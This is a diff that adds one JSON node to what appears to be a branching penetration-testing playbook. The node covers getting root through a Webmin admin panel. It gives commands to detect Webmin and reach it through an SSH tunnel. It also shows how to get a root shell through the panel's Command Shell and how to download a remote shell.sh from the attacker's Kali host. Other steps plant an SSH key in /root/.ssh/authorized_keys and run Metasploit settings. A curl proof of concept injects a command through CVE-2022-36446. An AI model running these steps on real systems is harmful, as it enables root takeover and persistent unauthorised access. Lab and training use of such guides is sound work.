@@ -1,0 +1,26 @@
+{
+  "id": "webmin_rce",
+  "phase": "POST",
+  "title": "Webmin — RCE via Command Shell, Upload, and CVEs",
+  "body": "Webmin is a web-based system administration panel that runs as root. Getting authenticated access to Webmin is almost always a direct path to root — it was designed to let admins run system commands, so it has native command execution built in. You don't need a CVE if you have valid credentials.\n\nWebmin often runs on localhost-only (port 10000) and is invisible to external nmap scans. It shows up in linpeas under 'Active Ports' or as a running process: /usr/bin/perl /usr/share/webmin/miniserv.pl. When you see it, the credential to try is whatever you've found for the current user — service accounts, config file passwords, and sudo passwords all frequently work.\n\nCommon attack paths in priority order: (1) Tools → Command Shell if available, (2) Others → Upload and Download → Download from web to write files as root, (3) CVE-based RCE if unauthenticated or with limited auth.",
+  "cmd": "# ══════════════════════════════════════════════════\n# 1 — DETECT WEBMIN\n# ══════════════════════════════════════════════════\n# In linpeas output — look for:\n#   tcp LISTEN 0 4096 0.0.0.0:10000 0.0.0.0:*    ← port 10000\n#   /usr/bin/perl /usr/share/webmin/miniserv.pl   ← process\n#   Webmin entries in /etc/webmin/                 ← config files\n\n# From the target shell:\nss -lntp | grep 10000\nps aux | grep webmin\ncat /etc/webmin/version     # exact version number\n\n# ══════════════════════════════════════════════════\n# 2 — ACCESS (requires port forward from target to Kali)\n# ══════════════════════════════════════════════════\n# If Webmin is on 0.0.0.0:10000 but filtered externally:\nssh -L 10000:127.0.0.1:10000 <user>@<IP>\n# Then: https://127.0.0.1:10000 in your browser\n# Accept the self-signed cert.\n\n# If Webmin is on 127.0.0.1:10000 (localhost only):\nssh -L 10000:127.0.0.1:10000 <user>@<IP>\n# Same — forwards your local 10000 to the target's 10000.\n\n# ══════════════════════════════════════════════════\n# 3 — LOG IN\n# ══════════════════════════════════════════════════\n# Default creds: admin/admin, root/<rootpassword>\n# Try the password from config.php / linpeas findings\n# Webmin authenticates against PAM — system user passwords work.\n\n# ══════════════════════════════════════════════════\n# 4 — ROOT SHELL VIA COMMAND SHELL (fastest)\n# ══════════════════════════════════════════════════\n# In Webmin sidebar: Tools → Command Shell\n# Runs commands as root directly in the browser.\n# Get proof:\n#   id\n#   cat /root/proof.txt\n#   cat /root/root.txt\n\n# If Command Shell is not in the menu:\n# Tools → Custom Commands → Create a new command\n\n# ══════════════════════════════════════════════════\n# 5 — ROOT FILE WRITE (Others → Upload and Download)\n# ══════════════════════════════════════════════════\n# Tools → Upload and Download → Download from web\n# URL: http://<KALI>/shell.sh\n# Destination: /tmp/shell.sh  (owned by root)\n# Then execute via Command Shell or cron.\n\n# Or: Upload to server → write authorized_keys as root:\n# Upload your Kali public key to /root/.ssh/authorized_keys\n# Then: ssh root@<IP>\n\n# ══════════════════════════════════════════════════\n# 6 — CVE-BASED RCE (unauthenticated or partial auth)\n# ══════════════════════════════════════════════════\n# Webmin 1.996 — CVE-2022-36446 (package update RCE):\nsearchsploit webmin 1.996\n# Webmin 1.890 — CVE-2019-15107 (password change RCE, unauth):\nsearchsploit webmin 1.890\n# Metasploit module:\n# use exploit/linux/http/webmin_packageup_rce\n# set RHOSTS 127.0.0.1\n# set RPORT 10000\n# set USERNAME svc-account\n# set PASSWORD 'best&_#Password@2021!!!'\n# set SSL true\n# run\n\n# PoC curl (CVE-2022-36446 — package update command injection):\ncurl -sk -X POST https://127.0.0.1:10000/package-updates/update.cgi \\\n  -b 'sid=<SESSION_COOKIE>' \\\n  --data 'u=apt&yes=1&updateall=1;id>/tmp/pwn'\ncat /tmp/pwn",
+  "warn": "Webmin runs as root — every action you take in it executes with full system privileges. Command Shell is the cleanest path but may be disabled by the admin. The Upload/Download module is almost always available and lets you write files anywhere on the filesystem as root. The version number is in /etc/webmin/version and on the dashboard — check it to pick the right CVE. The SSH local port forward must stay alive while you use Webmin; if the SSH session dies, the port closes.",
+  "choices": [
+    {
+      "label": "Got root shell — grab proof",
+      "next": "got_root_linux"
+    },
+    {
+      "label": "Wrote authorized_keys — SSH in as root",
+      "next": "got_root_linux"
+    },
+    {
+      "label": "Need to port forward to reach Webmin first",
+      "next": "ssh_local_portfwd"
+    },
+    {
+      "label": "Back to Linux post-exploit",
+      "next": "linux_post_exploit"
+    }
+  ]
+}
